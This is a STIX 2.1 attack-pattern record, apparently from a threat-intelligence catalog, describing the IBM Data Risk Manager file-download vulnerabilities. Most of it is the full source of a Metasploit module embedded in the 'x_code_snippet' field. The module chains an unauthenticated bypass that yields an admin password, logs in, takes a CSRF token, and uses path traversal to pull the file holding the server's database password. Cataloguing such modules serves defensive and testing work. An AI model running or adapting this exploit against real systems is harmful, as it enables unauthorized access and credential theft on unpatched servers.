{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--76fe419e-ce4d-4f35-a72b-f05651da46ee",
    "created": "2024-08-14T16:23:43.749659Z",
    "modified": "2024-08-14T16:23:43.749663Z",
    "name": "IBM Data Risk Manager Arbitrary File Download",
    "description": " IBM Data Risk Manager (IDRM) contains two vulnerabilities that can be chained by an unauthenticated attacker to download arbitrary files off the system. The first is an unauthenticated bypass, followed by a path traversal. This module exploits both vulnerabilities, giving an attacker the ability to download (non-root) files. A downloaded file is zipped, and this module also unzips it before storing it in the database. By default this module downloads Tomcat's application.properties files, which contains the database password, amongst other sensitive data. At the time of disclosure, this is was a 0 day, but IBM later patched it and released their advisory. Versions 2.0.2 to 2.0.4 are vulnerable, version 2.0.1 is not. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/ibm_drm_download.rb",
            "external_id": "ibm_drm_download.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_drm/ibm_drm_rce.md"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2020/Apr/33"
        },
        {
            "source_name": "reference",
            "url": "https://www.ibm.com/blogs/psirt/security-bulletin-vulnerabilities-exist-in-ibm-data-risk-manager-cve-2020-4427-cve-2020-4428-cve-2020-4429-and-cve-2020-4430/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'IBM Data Risk Manager Arbitrary File Download',\n        'Description' => %q{\n          IBM Data Risk Manager (IDRM) contains two vulnerabilities that can be chained by\n          an unauthenticated attacker to download arbitrary files off the system.\n          The first is an unauthenticated bypass, followed by a path traversal.\n          This module exploits both vulnerabilities, giving an attacker the ability to download (non-root) files.\n          A downloaded file is zipped, and this module also unzips it before storing it in the database.\n          By default this module downloads Tomcat's application.properties files, which contains the\n          database password, amongst other sensitive data.\n          At the time of disclosure, this is was a 0 day, but IBM later patched it and released their advisory.\n          Versions 2.0.2 to 2.0.4 are vulnerable, version 2.0.1 is not.\n        },\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'DefaultOptions' => {\n          'SSL' => true\n        },\n        'References' => [\n          [ 'CVE', '2020-4427' ], # auth bypass\n          [ 'CVE', '2020-4429' ], # insecure default password\n          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_drm/ibm_drm_rce.md' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2020/Apr/33' ],\n          [ 'URL', 'https://www.ibm.com/blogs/psirt/security-bulletin-vulnerabilities-exist-in-ibm-data-risk-manager-cve-2020-4427-cve-2020-4428-cve-2020-4429-and-cve-2020-4430/']\n        ],\n        'DisclosureDate' => '2020-04-21',\n        'Actions' => [\n          ['Download', { 'Description' => 'Download arbitrary file' }]\n        ],\n        'DefaultAction' => 'Download',\n        'Notes' => {\n          'Reliability' => [ ],\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8443),\n        OptString.new('TARGETURI', [ true, 'Default server path', '/']),\n        OptString.new('FILEPATH', [\n          false, 'Path of the file to download',\n          '/home/a3user/Tomcat/webapps/albatross/WEB-INF/classes/application.properties'\n        ])\n      ]\n    )\n  end\n\n  def check\n    # at the moment there is no better way to detect AND be stealthy about it\n    session_id = Rex::Text.rand_text_alpha(5..12)\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'albatross', 'saml', 'idpSelection'),\n      'method' => 'GET',\n      'vars_get' => {\n        'id' => session_id,\n        'userName' => 'admin'\n      }\n    })\n    if res && (res.code == 302)\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def create_session_id\n    # step 1: create a session ID and try to make it stick\n    session_id = Rex::Text.rand_text_alpha(5..12)\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'albatross', 'saml', 'idpSelection'),\n      'method' => 'GET',\n      'vars_get' => {\n        'id' => session_id,\n        'userName' => 'admin'\n      }\n    })\n    if res && (res.code != 302)\n      fail_with(Failure::Unknown, \"#{peer} - Failed to \\\"stick\\\" session ID\")\n    end\n\n    print_good(\"#{peer} - Successfully \\\"stickied\\\" our session ID #{session_id}\")\n\n    session_id\n  end\n\n  def free_the_admin(session_id)\n    # step 2: give the session ID to the server and have it grant us a free admin password\n    post_data = Rex::MIME::Message.new\n    post_data.add_part('', nil, nil, 'form-data; name=\"deviceid\"')\n    post_data.add_part(Rex::Text.rand_text_alpha(8..15), nil, nil, 'form-data; name=\"password\"')\n    post_data.add_part('admin', nil, nil, 'form-data; name=\"username\"')\n    post_data.add_part('', nil, nil, 'form-data; name=\"clientDetails\"')\n    post_data.add_part(session_id, nil, nil, 'form-data; name=\"sessionId\"')\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'albatross', 'user', 'login'),\n      'method' => 'POST',\n      'data' => post_data.to_s,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\"\n    })\n\n    unless res && (res.code == 200) && res.body[/\"data\":\"([0-9a-f-]{36})/]\n      fail_with(Failure::NoAccess, \"#{peer} - Failed to obtain the admin password.\")\n    end\n\n    password = Regexp.last_match(1)\n    print_good(\"#{peer} - We have obtained a new admin password #{password}\")\n\n    password\n  end\n\n  def login_and_csrf(password)\n    # step 3: login and get an authenticated cookie\n    res = send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'], 'albatross', 'login'),\n      'method' => 'POST',\n      'vars_post' => {\n        'userName' => 'admin',\n        'password' => password\n      }\n    })\n    unless res && (res.code == 302) && res.get_cookies\n      fail_with(Failure::NoAccess, \"#{peer} - Failed to authenticate as an admin.\")\n    end\n\n    print_good(\"#{peer} - ... and are authenticated as an admin!\")\n    cookie = res.get_cookies\n    url = res.redirection.to_s\n\n    # step 4: obtain CSRF header in order to be able to make valid requests\n    res = send_request_cgi({\n      'uri' => url,\n      'method' => 'GET',\n      'cookie' => cookie\n    })\n\n    unless res && (res.code == 200) && res.body =~ /var csrfToken = \"([0-9a-f-]{36})\";/\n      fail_with(Failure::NoAccess, \"#{peer} - Failed to authenticate obtain CSRF cookie.\")\n    end\n    csrf = Regexp.last_match(1)\n\n    return cookie, csrf\n  end\n\n  def run\n    # step 1: create a session ID and try to make it stick\n    session_id = create_session_id\n\n    # step 2: give the session ID to the server and have it grant us a free admin password\n    password = free_the_admin(session_id)\n\n    # step 3: login and get an authenticated cookie\n    # step 4: obtain CSRF header in order to be able to make valid requests\n    cookie, csrf = login_and_csrf(password)\n\n    # step 5: download the file!\n    post_data = {\n      'instanceId' => 'local_host',\n      'logLevel' => 'DEBUG',\n      'logFileNameList' => \"../../../../..#{datastore['FILEPATH']}\"\n    }.to_json\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'albatross', 'eurekaservice', 'fetchLogFiles'),\n      'method' => 'POST',\n      'cookie' => cookie,\n      'headers' => { 'CSRF-TOKEN' => csrf },\n      'data' => post_data.to_s,\n      'ctype' => 'text/json'\n    })\n\n    unless res && (res.code == 200) && !res.body.empty?\n      fail_with(Failure::Unknown, \"#{peer} - Failed to download file #{datastore['FILEPATH']}\")\n    end\n\n    Zip::File.open_buffer(res.body) do |zipfile|\n      # Not sure what happens if we receive garbage that's not a ZIP file, but that shouldn't\n      # happen? Either we get nothing or a proper zip file.\n      file = zipfile.find_entry(File.basename(datastore['FILEPATH']))\n      unless file\n        fail_with(Failure::Unknown, \"#{peer} - Incorrect file downloaded!\")\n      end\n\n      filedata = zipfile.read(file)\n      vprint_line(filedata.to_s)\n      fname = File.basename(datastore['FILEPATH'])\n\n      path = store_loot(\n        'IBM_DRM.http',\n        'application/octet-stream',\n        rhost,\n        filedata,\n        fname\n      )\n      print_good(\"File saved in: #{path}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-04-21"
}